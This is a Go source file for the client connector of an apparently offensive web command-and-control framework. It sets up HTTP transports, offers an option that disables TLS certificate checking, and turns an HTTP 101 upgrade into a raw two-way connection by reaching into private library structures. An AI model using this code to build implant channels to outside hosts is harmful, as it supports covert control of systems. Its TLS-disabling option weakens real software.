package wc2

import (
	"context"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"reflect"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	// NOTE(dij): This is fucking annoying.. why? The error is ALWAYS nil!
	jar, _ = cookiejar.New(nil)

	// Default is the default web c2 client that can be used to create client
	// connections.
	Default = &Client{Client: DefaultHTTP}

	// DefaultHTTP is the HTTP Client struct that is used when the provided
	// client is nil.
	DefaultHTTP = &http.Client{Jar: jar, Transport: DefaultTransport}

	// DefaultTransport is the default HTTP transport struct that contains the
	// default settings and timeout values used in DefaultHTTP. This struct uses
	// any set proxy settings contained in the execution environment.
	DefaultTransport = &http.Transport{
		Proxy:                 device.Proxy,
		DialContext:           (&net.Dialer{Timeout: com.DefaultTimeout, KeepAlive: com.DefaultTimeout, DualStack: true}).DialContext,
		MaxIdleConns:          64,
		IdleConnTimeout:       com.DefaultTimeout,
		ForceAttemptHTTP2:     false,
		TLSHandshakeTimeout:   com.DefaultTimeout,
		ExpectContinueTimeout: com.DefaultTimeout,
		ResponseHeaderTimeout: com.DefaultTimeout,
		// Setting these values low to fix a bug where the HTTP Transport
		// creates a BuffIO writer/reader pair with 4096 unused bytes. Why?!
		ReadBufferSize:  1,
		WriteBufferSize: 1,
		// This setting allows us to overrite 'errCallerOwnsConn' in transport.go
		// which allows for the 'writeLoopClosed' chan to be closed.
		// Setting this to true, overrites the 'err' value and prevents keeping
		// the 'persistConn` struct sticking around on the heap.
		// Otherwise ^THIS CAUSES A _SLOW_ MEMORY LEAK!!!
		//
		// Is this a Golang bug? or intended behavior?
		DisableKeepAlives: true,
	}
)

// Client is a simple struct that supports the C2 client connector interface.
// This can be used by clients to connect to a Web instance.
//
// By default, this struct will use the DefaultHTTP struct.
//
// The initial unspecified Target state will be empty and will use the default
// (Golang) values.
type Client struct {
	_      [0]func()
	Target *Target
	*http.Client
}
type client struct {
	_ [0]func()
	r *http.Response
	net.Conn
}

func (c *client) Close() error {
	if c.r == nil {
		return nil
	}
	err := c.Conn.Close()
	c.r.Body.Close()
	c.r = nil
	return err
}

// Insecure will set the TLS verification status of the Client to the specified
// boolean value and return itself.
func (c *Client) Insecure(i bool) *Client {
	t, ok := c.Transport.(*http.Transport)
	if !ok {
		return c
	}
	if t.TLSClientConfig == nil {
		t.TLSClientConfig = &tls.Config{InsecureSkipVerify: i}
	} else {
		t.TLSClientConfig.InsecureSkipVerify = i
	}
	return c
}
func rawParse(r string) (*url.URL, error) {
	var (
		i   = strings.IndexRune(r, '/')
		u   *url.URL
		err error
	)
	if i == 0 && len(r) > 2 && r[1] != '/' {
		u, err = url.Parse("/" + r)
	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
		u, err = url.Parse("//" + r)
	} else {
		u, err = url.Parse(r)
	}
	if err != nil {
		return nil, err
	}
	if len(u.Host) == 0 {
		return nil, xerr.Sub("empty host field", 0x30)
	}
	if u.Host[len(u.Host)-1] == ':' {
		return nil, xerr.Sub("invalid port specified", 0x31)
	}
	if len(u.Scheme) == 0 {
		u.Scheme = com.NameHTTP
	}
	return u, nil
}

// NewClient returns a new WC2 client instance with the supplied timeout and
// Target options.
//
// If the durartion is less than one or equals 'com.DefaultTimeout' than this
// function will use the cached 'DefaultTransport' variable instead.
func NewClient(d time.Duration, t *Target) *Client {
	j, _ := cookiejar.New(nil)
	if d <= 0 || d == com.DefaultTimeout {
		return &Client{Target: t, Client: &http.Client{Jar: j, Transport: DefaultTransport}}
	}
	return &Client{
		Target: t,
		Client: &http.Client{
			Jar: j,
			Transport: &http.Transport{
				Proxy:                 device.Proxy,
				DialContext:           (&net.Dialer{Timeout: d, KeepAlive: d, DualStack: true}).DialContext,
				MaxIdleConns:          64,
				IdleConnTimeout:       d,
				ForceAttemptHTTP2:     false,
				TLSHandshakeTimeout:   d,
				ExpectContinueTimeout: d,
				ResponseHeaderTimeout: d,
				ReadBufferSize:        1,
				WriteBufferSize:       1,
				DisableKeepAlives:     true,
			},
		},
	}
}

// Connect creates a C2 client connector that uses the same properties of the
// Client and Target instance parents.
func (c *Client) Connect(x context.Context, a string) (net.Conn, error) {
	return connect(x, c.Target, c.Client, a)
}
func connect(x context.Context, t *Target, c *http.Client, a string) (net.Conn, error) {
	// NOTE(dij): URL is empty we will parse it and mutate it with our Target.
	u, err := rawParse(a)
	if err != nil {
		return nil, err
	}
	r, _ := http.NewRequestWithContext(x, http.MethodGet, "", nil)
	if r.URL = u; t != nil && !t.empty() {
		t.mutate(r)
	}
	d, err := c.Do(r)
	if r = nil; err != nil {
		return nil, err
	}
	if d.StatusCode != http.StatusSwitchingProtocols {
		return nil, xerr.Sub("invalid HTTP response", 0x32)
	}
	if _, ok := d.Body.(io.ReadWriteCloser); !ok {
		d.Body.Close()
		return nil, xerr.Sub("body is not writable", 0x33)
	}
	// NOTE(dij): I really don't like using reflect, but it's the only
	//            way to grab the 'net.Conn' inside the private struct that the http
	//            library uses.
	//            It's needed for 'SetDeadline*'.
	if xb := reflect.ValueOf(d.Body); xb.IsValid() && xb.Kind() == reflect.Ptr {
		if xe := xb.Elem(); xe.IsValid() && xe.Kind() == reflect.Struct {
			for xi := 0; xi < xe.NumField(); xi++ {
				if xv := xe.Field(xi); xv.IsValid() && !xv.IsZero() && xv.CanInterface() {
					if x, ok := xv.Interface().(net.Conn); ok {
						return &client{r: d, Conn: x}, nil
					}
				}
			}
		}
	}
	if bugtrack.Enabled {
		bugtrack.Track("wc2.connect(): Struct type (%T) could not grab net.Conn!", d.Body)
	}
	d.Body.Close()
	return nil, xerr.Sub("could not get underlying net.Conn", 0x34)
}
